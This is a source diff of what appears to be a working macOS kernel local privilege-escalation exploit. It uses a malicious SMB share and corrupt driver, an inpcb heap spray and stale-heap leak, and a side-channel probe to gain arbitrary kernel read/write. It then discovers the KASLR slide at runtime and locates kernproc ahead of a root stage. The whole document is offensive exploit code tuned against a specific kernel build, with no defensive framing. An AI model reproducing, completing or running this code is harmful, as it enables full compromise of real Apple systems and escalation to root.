@@ -41,13 +41,29 @@
 #define DEFAULT_CTL          "/tmp/lpe-smb-ctl.json"
 #define DEFAULT_IDENT_COUNT  256
 #define DEFAULT_SPRAY_COUNT  8000
-/* IPV6_UNICAST_HOPS only accepts 0..255; identity sockets just need a
- * valid value -- uniqueness during probing comes from the confusion-written
- * marker (0x6000+i), not from these. */
-#define HOPS_BASE            1
+/* Every identity socket shares this hop limit: it is half of the probe key
+ * (u64@(inpcb+0x150) = cksum | hops<<32).  The kernel default is 64; 0x41
+ * makes the key unique to our sockets so confusion probes can never match
+ * freed/zeroed memory or other processes' inpcbs (the zero-key probe scheme
+ * panicked 25E253 by matching dead zone memory). */
+#define IDENT_HOPS           0x41
 #define LEAK_FILE            "poc.bin"
 #define LEAK_SIZE            (WEBDAV_MAX_READ_VALUE)   /* 0x12d0000 */
 #define LEAK_OFFSET          4096
+
+/* kernelcache.release.VirtualMac2,1 (25E253, UUID 1CBB8755-...) layout.
+ * Runtime address = these + data slide.  Only the relative ranges matter:
+ * __DATA_CONST is scanned for the kernproc pointer; the __DATA range bounds
+ * the slide candidates for A.inp_pcbinfo. */
+#define KC_DATA_CONST_LO     0xfffffe0007790000ULL
+#define KC_DATA_CONST_HI     0xfffffe0007eac000ULL
+#define KC_DATA_LO           0xfffffe000a8a8000ULL
+#define KC_DATA_HI           0xfffffe000ab9c000ULL
+
+/* zalloc zone-map VA range covering GEN0..GEN3 (fixed VAs; bounds from the
+ * victim's panic log, padded).  inpcb zone elements live here. */
+#define ZONE_MAP_LO          0xfffffe1876000000ULL
+#define ZONE_MAP_HI          0xfffffe3000000000ULL
 
 struct krw {
     /* corrupt driver child */
@@ -59,7 +75,6 @@ struct krw {
     /* identity sockets */
     int     fds[1024];
     int     nfds;
-    int     hops_base;
 
     /* redirect pair */
     int     fd_a, fd_b;
@@ -71,6 +86,7 @@ struct krw {
     int      ndamaged;
 
     uint64_t slide;
+    uint64_t kernproc;
 };
 
 /* ------------------------------------------------------------------ */
@@ -117,7 +133,6 @@ krw_open(const char *corrupt_bin, const char *server_url,
     if (k == NULL)
         return NULL;
     k->fd_a = k->fd_b = -1;
-    k->hops_base = HOPS_BASE;
     snprintf(k->ctl_path, sizeof(k->ctl_path), "%s", ctl_path);
 
     if (pipe(in_pipe) || pipe(out_pipe))
@@ -169,7 +184,7 @@ ctl_write(krw_t *k, uint64_t key_hi, uint64_t key_low, uint32_t state,
     if (f == NULL)
         return -1;
     fprintf(f, "{\"lease_key_hi\": %llu, \"lease_key_low\": %llu, "
-               "\"lease_state\": %u, \"epoch\": %u, \"lease_v1\": false}\n",
+               "\"lease_state\": %u, \"epoch\": %u, \"lease_v1\": true}\n",
             (unsigned long long)key_hi, (unsigned long long)key_low,
             state, epoch);
     fclose(f);
@@ -205,15 +220,14 @@ krw_corrupt_u32(krw_t *k, uint64_t T, uint32_t val, uint16_t epoch,
 /* ------------------------------------------------------------------ */
 
 int
-krw_identity_open(krw_t *k, int n, int hops_base)
+krw_identity_open(krw_t *k, int n)
 {
     int i;
 
-    k->hops_base = hops_base;
     for (i = 0; i < n && k->nfds < (int)(sizeof(k->fds)/sizeof(k->fds[0]));
          i++) {
         int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
-        int hops = hops_base + (k->nfds % 254);   /* stay within 1..254 */
+        int hops = IDENT_HOPS;
         if (fd < 0) {
             fprintf(stderr, "[krw] socket %d: %s\n", i, strerror(errno));
             break;
@@ -227,38 +241,55 @@ krw_identity_open(krw_t *k, int n, int hops_base)
         k->fds[k->nfds++] = fd;
     }
     fprintf(stderr, "[krw] identity set: %d ICMPv6 dgram sockets "
-            "(hops %d..%d)\n", k->nfds, hops_base,
-            hops_base + (k->nfds ? (k->nfds - 1) % 254 : 0));
+            "(hops 0x%x)\n", k->nfds, IDENT_HOPS);
     return k->nfds;
 }
 
+void
+krw_identity_close(krw_t *k)
+{
+    int i;
+    for (i = 0; i < k->nfds; i++)
+        close(k->fds[i]);
+    k->nfds = 0;
+}
+
+/* A probe hit zeroes the filt pointer high half -> getsockopt(ICMP6_FILTER)
+ * fails with EFAULT on exactly the matched socket. */
 static int
-fd_from_marker(krw_t *k, uint32_t marker)
+fd_with_broken_filter(krw_t *k, int skip1, int skip2)
 {
     int i;
     for (i = 0; i < k->nfds; i++) {
-        int hops = 0;
-        socklen_t len = sizeof(hops);
-        if (getsockopt(k->fds[i], IPPROTO_IPV6, IPV6_UNICAST_HOPS,
-                       &hops, &len) == 0 &&
-            (uint32_t)(hops & 0xffff) == (marker & 0xffff))
+        struct icmp6_filter filt;
+        socklen_t flen = sizeof(filt);
+        if (k->fds[i] == skip1 || k->fds[i] == skip2)
+            continue;
+        errno = 0;
+        if (getsockopt(k->fds[i], IPPROTO_ICMPV6, ICMP6_FILTER,
+                       &filt, &flen) != 0)
             return k->fds[i];
     }
     return -1;
 }
 
 int
-krw_probe_inpcb(krw_t *k, uint64_t P, uint32_t marker, uint64_t *addr_out)
+krw_probe_inpcb(krw_t *k, uint64_t P, int skip1, int skip2, uint64_t *addr_out)
 {
-    /* K = P+0x128: gates *(P+0x130)==0 (options, NULL for fresh sockets),
-     * keys u64@(P+0x158) = hash_element (0), u64@(P+0x160) = saved_ppcb (0).
-     * Writes: hops @ P+0x154 = marker; filt @ P+0x148 |= 0x80 (repaired
-     * later); outputopts/moptions (P+0x138/0x140) zeroed (already NULL). */
+    /* K = P+0x120: mutex words *(P+0x120) == *(P+0x128) == 0 (zeroed route
+     * cache of a fresh unbound socket -> lck_mtx fast path, no validation),
+     * keys u64@(P+0x150) = cksum | IDENT_HOPS<<32 (0xffffffff | 0x41<<32 --
+     * matches ONLY our live identity inpcbs, never freed or foreign memory),
+     * u64@(P+0x158) = hash_element == 0.
+     * Writes filt high half @ P+0x14c = 0 (lease_state); lease v1 response
+     * so no epoch write at K+0x50. */
+    uint64_t key_hi = (uint64_t)INPCB_FRESH_CKSUM |
+                      ((uint64_t)IDENT_HOPS << 32);
     int fd;
 
-    if (krw_corrupt_u32(k, P + INPCB_OFF_HOPS, marker, 0, 0, 0) != 0)
+    if (krw_corrupt_u32(k, P + 0x14c, 0, 0, key_hi, 0) != 0)
         return -1;
-    fd = fd_from_marker(k, marker);
+    fd = fd_with_broken_filter(k, skip1, skip2);
     if (fd >= 0) {
         *addr_out = P;
         if (k->ndamaged < (int)(sizeof(k->damaged)/sizeof(k->damaged[0])))
@@ -348,20 +379,140 @@ krw_redirect(krw_t *k, int fdA, uint64_t A, int fdB, uint64_t B)
 
     k->redirected = 1;
 
-    /* compute the KASLR slide via A.inp_pcbinfo == &ripcbinfo (static) */
-    {
-        uint8_t buf[32];
-        if (krw_read32(k, A + INPCB_OFF_PCBINFO, buf) == 0) {
-            uint64_t pcbinfo;
-            memcpy(&pcbinfo, buf, 8);
-            k->slide = pcbinfo - XNU_RIPCBINFO;
-            fprintf(stderr, "[krw] &ripcbinfo = 0x%llx -> KASLR slide "
-                    "0x%llx\n", (unsigned long long)pcbinfo,
-                    (unsigned long long)k->slide);
+    /* The KASLR slide is discovered afterwards by krw_discover_slide()
+     * (validating A.inp_pcbinfo against the ripcbinfo list), which needs
+     * the R/W window that only becomes usable here. */
+    return 0;
+}
+
+/* ------------------------------------------------------------------ */
+/* runtime KASLR slide + _kernproc discovery (no static addresses: the  */
+/* victim is a VirtualMac2,1 whose kernelcache layout differs from the  */
+/* t6050 KDK the old constants came from)                               */
+/* ------------------------------------------------------------------ */
+
+/* inpcbinfo.ipi_listhead offset: ipi_entry(16) + gc/timer fn ptrs(16) +
+ * two intimercount(16) + lck_rw_t(16) = 0x40.  If lck_rw_t were 8 bytes it
+ * would be 0x38; try both. */
+static const uint32_t ipi_listhead_offs[] = { 0x40, 0x38 };
+
+static int
+ptr_plausible(uint64_t v)
+{
+    return (v >> 48) == 0xffff && v != 0;
+}
+
+int
+krw_discover_slide(krw_t *k)
+{
+    uint64_t pcbinfo;
+    uint64_t slo, shi, s;
+    size_t o;
+
+    if (!k->redirected)
+        return -1;
+    pcbinfo = krw_read64(k, k->addr_a + INPCB_OFF_PCBINFO);
+    if (!ptr_plausible(pcbinfo)) {
+        fprintf(stderr, "[krw] discover: bad inp_pcbinfo 0x%llx\n",
+                (unsigned long long)pcbinfo);
+        return -1;
+    }
+
+    /* &ripcbinfo is in the kernelcache __DATA segment, so
+     * slide = pcbinfo - &ripcbinfo is 0x4000-aligned and bounded by the
+     * __DATA range: ~189 candidates. */
+    slo = pcbinfo - KC_DATA_HI;
+    shi = pcbinfo - KC_DATA_LO;
+    slo = (slo + 0x3fff) & ~0x3fffULL;
+
+    for (s = slo; s <= shi; s += 0x4000) {
+        uint64_t r = pcbinfo - s;      /* candidate &ripcbinfo */
+        for (o = 0; o < sizeof(ipi_listhead_offs)/sizeof(*ipi_listhead_offs);
+             o++) {
+            uint64_t lh = krw_read64(k, r + ipi_listhead_offs[o]);
+            uint64_t first, back;
+            if (!ptr_plausible(lh))
+                continue;
+            first = krw_read64(k, lh);          /* lh_first */
+            if (first < ZONE_MAP_LO || first >= ZONE_MAP_HI ||
+                (first & 0x3ff) != 0)
+                continue;
+            back = krw_read64(k, first + INPCB_OFF_PCBINFO);
+            if (back != r)
+                continue;
+            k->slide = s;
+            fprintf(stderr, "[krw] slide discovered: 0x%llx "
+                    "(&ripcbinfo = 0x%llx, listhead off 0x%x)\n",
+                    (unsigned long long)s, (unsigned long long)r,
+                    ipi_listhead_offs[o]);
+            return 0;
         }
+    }
+    fprintf(stderr, "[krw] slide discovery failed (pcbinfo 0x%llx)\n",
+            (unsigned long long)pcbinfo);
+    return -1;
+}
+
+/* _kernproc is a SECURITY_READ_ONLY_LATE pointer in __DATA_CONST.  proc0
+ * itself is zalloc'd (proc_task_zone, GEN range).  Scan for a GEN-range
+ * pointer whose target has pid 0 and a root ucred chain. */
+int
+krw_discover_kernproc(krw_t *k)
+{
+    uint64_t lo = KC_DATA_CONST_LO + k->slide;
+    uint64_t hi = KC_DATA_CONST_HI + k->slide;
+    uint64_t addr;
+    uint8_t buf[32];
+    int found = 0;
+
+    if (!k->redirected || k->slide == 0)
+        return -1;
+    fprintf(stderr, "[krw] scanning __DATA_CONST for kernproc "
+            "(0x%llx..0x%llx)\n", (unsigned long long)lo,
+            (unsigned long long)hi);
+    for (addr = lo; addr < hi && !found; addr += 8) {
+        int j;
+        if ((addr & 0x1f) == 0) {
+            if (krw_read32(k, addr, buf) != 0)
+                continue;
+        }
+        /* reuse the window: offset within the 32-byte read */
+        j = (int)(addr & 0x1f);
+        {
+            uint64_t v;
+            memcpy(&v, buf + j, 8);
+            if (v < ZONE_MAP_LO || v >= ZONE_MAP_HI)
+                continue;
+            /* candidate proc pointer: proc0 has p_pid == 0 */
+            if (krw_read32u(k, v + PROC_OFF_PID) != 0)
+                continue;
+            {
+                uint64_t ro = krw_read64(k, v + PROC_OFF_RO);
+                uint64_t cred, uidgid;
+                if (!ptr_plausible(ro))
+                    continue;
+                cred = krw_read64(k, ro + PROC_RO_OFF_UCRED);
+                if (cred < ZONE_MAP_LO || cred >= ZONE_MAP_HI)
+                    continue;
+                uidgid = krw_read32u(k, cred + UCRED_OFF_UID);
+                if (uidgid != 0)
+                    continue;   /* kernel_task runs as root */
+            }
+            fprintf(stderr, "[krw] kernproc candidate @ 0x%llx -> "
+                    "proc0 0x%llx\n", (unsigned long long)addr,
+                    (unsigned long long)v);
+            k->kernproc = v;
+            found = 1;
+        }
+    }
+    if (!found) {
+        fprintf(stderr, "[krw] kernproc not found in __DATA_CONST\n");
+        return -1;
     }
     return 0;
 }
+
+uint64_t krw_kernproc(krw_t *k) { return k->kernproc; }
 
 static int
 window_payload(krw_t *k, uint64_t target, uint8_t out[32])
@@ -501,15 +652,19 @@ krw_cleanup(krw_t *k)
     int i;
 
     if (k->redirected) {
-        /* A: outputopts / moptions got |= 0x80 during redirect; filt points
-         * at B+0x148.  B: filt points at the last window target. */
+        /* A: filt points at B+0x148 (window).  B: filt points at the last
+         * window target.  Zero both filt pointers before close so detach
+         * does not free garbage (the original kalloc.32 filters leak --
+         * acceptable).  moptions was |= 0x80'd by the parse side effect if
+         * the server sent lease flags (it doesn't), but zero it anyway. */
+        krw_write64(k, k->addr_a + INPCB_IN6P_ICMP6FILT, 0);
         krw_write64(k, k->addr_a + INPCB_IN6P_OUTPUTOPTS, 0);
         krw_write64(k, k->addr_a + INPCB_IN6P_MOPTIONS, 0);
-        krw_write64(k, k->addr_a + INPCB_IN6P_ICMP6FILT, 0);
         krw_write64(k, k->addr_b + INPCB_IN6P_ICMP6FILT, 0);
+        krw_write64(k, k->addr_b + INPCB_IN6P_MOPTIONS, 0);
         k->redirected = 0;
     }
-    /* probed sockets had filt |= 0x80 (and hops changed, harmless) */
+    /* probed sockets had their filt high half zeroed (repair to NULL) */
     for (i = 0; i < k->ndamaged; i++) {
         if (k->damaged[i] == k->addr_a || k->damaged[i] == k->addr_b)
             continue;
@@ -597,8 +752,9 @@ wdav_leak_candidates(const char *server, const char *mnt,
         size_t j;
         int seen;
         memcpy(&v, buf + i, 8);
-        /* kernel data pointer shape, 16-byte aligned (zone element) */
-        if ((v >> 48) != 0xffff || (v & 0xf) != 0)
+        /* inpcb zone element start: inside the zalloc GEN zone range and
+         * 0x400-aligned (INPCB_SIZE; elements pack exactly 16/page). */
+        if (v < ZONE_MAP_LO || v >= ZONE_MAP_HI || (v & 0x3ff) != 0)
             continue;
         seen = 0;
         for (j = 0; j < ncand; j++) {
@@ -615,7 +771,7 @@ wdav_leak_candidates(const char *server, const char *mnt,
         }
         cand[ncand++] = v;
     }
-    fprintf(stderr, "[krw] %zu unique candidate pointers\n", ncand);
+    fprintf(stderr, "[krw] %zu unique zone-range candidates\n", ncand);
 
     /* Clustering filter: inpcb zone elements cluster tightly, so drop
      * outliers far from the median.  Probing an unmapped candidate faults
@@ -682,7 +838,7 @@ leak_looks_like_table(const uint64_t *cand, size_t ncand)
     const uint64_t WINDOW = 0x1000000ULL;   /* 16 MB */
     size_t i, j, best = 0;
 
-    if (ncand < 200)
+    if (ncand < 48)
         return 0;
     for (i = 0; i < ncand; i++) {
         size_t n = 0;
@@ -794,19 +950,18 @@ main(int argc, char **argv)
         }
     }
 
-    /* 1. identity set (survives the whole stage) */
+    /* 1. corrupt driver (mounts the malicious smb share) */
     k = krw_open(corrupt_bin, smb_url, smb_mnt, ctl);
     if (k == NULL)
         return 1;
-    if (krw_identity_open(k, ident, HOPS_BASE) < 2) {
-        fprintf(stderr, "[krw] need at least 2 identity sockets\n");
-        goto out;
-    }
 
-    /* 2+3. spray + stale-heap leak, with a quality gate: only probe when
-     *    the leaked buffer really looks like the freed inpcb table (most
-     *    candidates inside one tight 16 MB window).  Probing garbage
-     *     candidates makes the kext dereference unmapped memory = panic. */
+    /* 2+3. spray -> destroy -> identity -> stale-heap leak, with a quality
+     *    gate: the identity set is opened AFTER the spray table is freed so
+     *    its inpcbs recycle freed table slots -- the leaked stale table then
+     *    points at our LIVE sockets.  Only probe when the leaked buffer
+     *    really looks like the freed inpcb table (most candidates inside one
+     *    tight 16 MB window).  Probing garbage candidates makes the kext
+     *    dereference unmapped memory = panic. */
     {
         int attempt;
         int good = 0;
@@ -818,6 +973,9 @@ main(int argc, char **argv)
                 fprintf(stderr, "[krw] retrying spray+leak "
                         "(attempt %d/6)\n", attempt + 1);
 
+            if (k->nfds)
+                krw_identity_close(k);
+
             sp = inpcb_spray_start(spray_n);
             if (sp == NULL) {
                 fprintf(stderr, "[krw] spray failed\n");
@@ -826,6 +984,11 @@ main(int argc, char **argv)
             fprintf(stderr, "[krw] sprayed %d sockets, freeing\n",
                     inpcb_spray_count(sp));
             inpcb_spray_destroy(sp);
+
+            if (krw_identity_open(k, ident) < 2) {
+                fprintf(stderr, "[krw] need at least 2 identity sockets\n");
+                goto out;
+            }
 
             free(cand);
             cand = NULL;
@@ -846,7 +1009,10 @@ main(int argc, char **argv)
         }
     }
 
-    /* 4. probe candidates until two identity sockets are matched */
+    /* 4. probe candidates until two identity sockets are matched.  Misses
+     *    are harmless now: the probe keys (cksum|IDENT_HOPS<<32, hash==0)
+     *    only match our live identity inpcbs, so no write happens on a
+     *    mismatch -- a hit is detected via the broken-filter side channel. */
     {
         size_t i;
         int fdA = -1, fdB = -1;
@@ -855,8 +1021,7 @@ main(int argc, char **argv)
 
         for (i = 0; i < ncand && probes < max_probes; i++) {
             uint64_t addr = 0;
-            uint32_t marker = 0x6000 + (uint32_t)i;
-            int fd = krw_probe_inpcb(k, cand[i], marker, &addr);
+            int fd = krw_probe_inpcb(k, cand[i], fdA, fdB, &addr);
             probes++;
             if (fd >= 0) {
                 fprintf(stderr, "[krw] HIT: fd %d @ 0x%llx "
@@ -876,10 +1041,19 @@ main(int argc, char **argv)
             goto out;
         }
 
-        /* 5. redirect + slide */
+        /* 5. redirect A->B, then derive the KASLR slide at runtime by
+         *    validating A.inp_pcbinfo against the ripcbinfo list */
         if (krw_redirect(k, fdA, A, fdB, B) != 0)
             goto out;
-        fprintf(stderr, "[krw] KERNEL R/W ESTABLISHED, slide 0x%llx\n",
+        fprintf(stderr, "[krw] KERNEL R/W ESTABLISHED "
+                "(A 0x%llx -> B 0x%llx)\n",
+                (unsigned long long)A, (unsigned long long)B);
+        if (krw_discover_slide(k) != 0) {
+            fprintf(stderr, "[krw] slide discovery failed -- cannot "
+                    "continue safely\n");
+            goto out;
+        }
+        fprintf(stderr, "[krw] slide 0x%llx\n",
                 (unsigned long long)k->slide);
 
         /* 6. optional root stage */
